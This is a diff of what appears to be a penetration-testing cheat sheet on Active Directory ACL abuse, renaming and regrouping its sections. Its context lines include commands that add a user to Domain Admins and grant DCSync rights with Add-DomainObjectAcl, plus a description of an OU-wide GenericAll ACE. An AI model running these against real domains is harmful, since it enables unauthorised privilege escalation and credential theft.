@@ -7,9 +7,9 @@
   * [ACL-abuses](#ACL-abuses)
     * [Permissions on a user](#Permissions-on-a-user)
     * [Permissions on a group](#Permissions-on-a-group)
-    * [Writedacl on Domain Object](#Writedacl-on-Domain-Object)
-    * [With GenericAll Over a Domain Object](#With-GenericAll-Over-a-Domain-Object)
-    * [With GenericAll Over an OU](#With-GenericAll-Over-an-OU)
+    * [Permissions on ComputerObject](#Permissions-on-ComputerObject)
+    * [Permissions on Domain Object]([Permissions-on-Domain-Object)
+    * [Permissions on OU](#Permissions-on-OU)
     * [Writeowner of an object - Change the owner](#Writeowner-of-an-object---Change-the-owner)
     * [Owner of an object - Add GenericAll](#Owner-of-an-object---Add-GenericAll)
     * [NTLMRelay](#NTLMRelay)
@@ -281,8 +281,12 @@ Add-DomainGroupMember -Identity "<GROUP>" -Members <USER> -Verbose
 net group "Domain Admins" analyst1 /domain /add
 ```
 
-### Writedacl on Domain Object
-#### Add permissions for dcsync
+### Permissions on ComputerObject
+#### GenericWrite - Computer object takeover
+See [Computer object takeover](#Computer-object-Takeover) 
+
+### Permissions on Domain Object
+#### Writedacl - Add permissions for dcsync
 ```
 Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
 
@@ -290,10 +294,11 @@ Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -Princi
 Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
 ```
 
-### With GenericAll Over a Domain Object
+### GenericAll - Dcsync
 - Execute DC Sync
 
-### With GenericAll Over an OU
+### Permissions on OU
+#### Generic all - Inherit down
 - The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. 
 
 #### Fetch guids for all objects
